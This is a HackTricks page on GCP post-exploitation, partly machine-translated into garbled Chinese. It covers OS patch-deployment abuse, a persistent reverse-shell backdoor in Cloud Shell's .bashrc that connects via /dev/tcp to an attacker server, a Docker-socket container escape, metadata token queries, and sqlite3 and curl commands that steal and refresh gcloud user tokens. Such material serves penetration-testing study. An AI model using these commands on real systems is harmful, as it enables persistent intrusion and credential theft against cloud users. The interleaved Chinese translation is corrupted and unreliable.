

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


These are useful techniques once, somehow, you have compromised some GCP credentials or machine running in a GCP environment.

这些是一次有用的技术，不知何故，您损害了在GCP环境中运行的一些GCP凭据或机器。

# OS Patching

＃OS修补
If you gain access to a service account (either through credentials or by a default service account on a compute instance/cloud function) if it has the `osconfig.patchDeployments.create` permission you can create a [patch deployment](https://cloud.google.com/compute/docs/os-patch-management#patch_deployment_overview). This deployment will run a script on Windows and Linux compute instances at a defined interval under the context of the [OS Config agent](https://cloud.google.com/compute/docs/os-patch-management#how_os_patch_management_works).

如果您可以访问服务帐户（通过凭据或通过Compute实例/云函数在默认服务帐户中），则如果它具有`osconfig.patchdeployments.create`允许的权限，则可以创建[patch exployment]（https：/https：/https：/https：/ /cloud.google.com/compute/docs/os-patch-management#patch_deployment_overview）。 此部署将在[OS Config Agent]（https://cloud.google.com/compute/compute/docs/os-patch-management-management#how_os_os_os_patch_management_works）的上下文中以定义的间隔运行Windows和Linux计算实例上的脚本。

Automated tooling such as [patchy]( https://github.com/rek7/patchy) exists to detect and exploit the presence of lax permissions on a compute instance or cloud function.

存在自动化工具，例如[PATDY]（https://github.com/rek7/patchy）存在以检测和利用在计算实例或云功能上存在LAX权限的存在。

If you want to manually install the patch deployment run the following gcloud command, a patch boiler plate can be found [here](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch_deployment.json):

如果要手动安装补丁部署运行以下gcloud命令，可以找到一个补丁锅炉板[here]（https://github.com/rek7/patchy/patchy/blob/main/main/main/pkg/engine/patches/patch_deployment。 JSON）：

`gcloud compute os-config patch-deployments create my-update --file=patch.json`

`gcloud Compute OS-Config Patch-Deployments创建My-Update -file = Patch.json```

# Google’s Cloud Shell <a href="#e5eb" id="e5eb"></a>

## Persistent Backdoor

[**Google Cloud Shell**](https://cloud.google.com/shell/)  provides you with command-line access to your cloud resources directly from your browser without any associated cost.

[** Google Cloud Shell **]（https://cloud.google.com/shell/）可直接从浏览器中访问对云资源的命令行访问，而无需任何相关费用。

You can access Google's Cloud Shell from the **web console** or running **`gcloud cloud-shell ssh`**.

您可以从** Web Console **访问Google的云外壳，也可以运行**`gcloud cloud-shell ssh` **。

This console has some interesting capabilities for attackers:

该控制台为攻击者具有一些有趣的功能：

1. **Any Google user with access to Google Cloud** has access to a fully authenticated Cloud Shell instance.

1. **任何具有访问Google Cloud的Google用户**都可以访问完全认证的云外壳实例。
2. Said instance will **maintain its home directory for at least 120 days** if no activity happens.

2.所述实例将**维持其主目录至少120天**如果没有任何活动。
3. There is **no capabilities for an organisation to monitor** the activity of that instance.

3.组织没有能力监视该实例的活动。

This basically means that an attacker may put a backdoor in the home directory of the user and as long as the user connects to the GC Shell every 120days at least, the backdoor will survive and the attacker will get a shell everytime it's run just by doing:

这基本上意味着攻击者可以在用户的主目录中放置后门，并且只要用户至少每120天连接到GC外壳，后门就可以生存，并且攻击者每次运行时都会获得外壳 ：

```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```

## Container Escape

Note that the Google Cloud Shell runs inside a container, you can **easily escape to the host** by doing:

请注意，Google Cloud Shell在容器内运行，您可以**轻松地逃到主机**，通过：

```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```

This is not considered a vulnerability by google, but it gives you a wider vision of what is happening in that env.

这不是Google认为的漏洞，但它使您可以更广泛地了解该ENV中发生的情况。

Moreover, notice that from the host you can find a service account token:

此外，请注意，从主机可以找到一个服务帐户令牌：

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```

With the following scopes:

与以下范围：

```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```

# Token Hijacking

## Authenticated User

##身份验证的用户

If you manage to access the home folder of an **authenticated user in GCP**, by **default**, you will be able to **get tokens for that user as long as you want** without needing to authenticated and independently on the machine you use his tokens from and even if the user has MFA configured.

如果您设法访问GCP **的**身份验证用户的主文件夹，则**默认**，只要您想要**，您就可以**获得该用户的令牌 在机器上独立使用他的令牌，即使用户配置了MFA。

This is because by default you **will be able to use the refresh token as long** as you want to generate new tokens.

这是因为默认情况下，您**将能够像您想要生成新令牌一样使用刷新令牌。

To get the current token of a user you can run:

为了获取可以运行的用户的当前令牌：

```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```

To get the details to generate a new access token run:

要获取详细信息以生成新的访问令牌运行：

```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```

To get a new refreshed access token with the refresh token, client ID, and client secret run:

为了获得新的刷新访问令牌，使用刷新令牌，客户端ID和客户端秘密运行：

```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```

## Service Accounts

##服务帐户

Just like with authenticated users, if you manage to **compromise the private key file** of a service account you will be able to **access it usually as long as you want**.\

就像使用身份验证的用户一样，如果您设法**妥协服务帐户的私钥文件**，您通常可以**访问它，只要您想要**。
However, if you steal the **OAuth token** of a service account this can be even more interesting, because, even if by default these tokens are useful just for an hour, if the **victim deletes the private api key, the OAuh token will still be valid until it expires**.

但是，如果您窃取服务帐户的** oauth doken **，这可能会更有趣，因为即使默认情况下，这些令牌也只有一个小时，如果**受害者删除了私人API密钥， OAUH令牌仍将有效，直到它到期为止。

## Metadata

Obviously, as long as you are inside a machine running in the GCP environment you will be able to **access the service account attached to that machine contacting the metadata endpoint** (note that the Oauth tokens you can access in this endpoint are usually restricted by scopes).

显然，只要您在GCP环境中运行的机器内 受范围的限制）。

## Remediations

##补救措施

Some remediations for these techniques are explained in [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

这些技术的一些补救措施在[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-part-2] https://www.netskope.com/ 博客/gcp-oauth-token-hijacking in-google-cloud-part-2）

# References

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

<summary> <strong>支持hacktricks并获得好处！</strong> </summary>

- Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!

 - 您在**网络安全公司**工作吗？ 您是否想看到您的**公司在hacktricks **中刊登广告？ 还是您想访问**最新版本的豌豆或在pdf **中下载hacktricks？ 检查[**订阅计划**]（https://github.com/sponsors/carlospolop）！

- Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)

 - 发现[**豌豆家庭**]（https://opensea.io/collection/the-peass-family），我们的独家[** nfts **]（https://opensea.io/collection） /家庭家庭）

- Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)

 - 获取[**官方豌豆和hacktricks赃物**]（https://peass.creator-spring.com）

- **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/carlospolopm)**.**

 -  **加入** [**💬**]（https://emojipedia.org/speech-balloon/）[** discord group **]（https://discord.gg/hrep4ruj7f）或[ **电报组**]（https://t.me/peass）或**在** Twitter ** [**🐦**]（https://github.com/carloppolop/hacktrickss on ** twitter **） /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.md）eardme.md）eghterme.md）eghterme.md）eghterme.md）eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **通过将PRS提交给** [** hacktricks github repo **]（https://github.com/carloppolop/hacktricks）**。

</details>


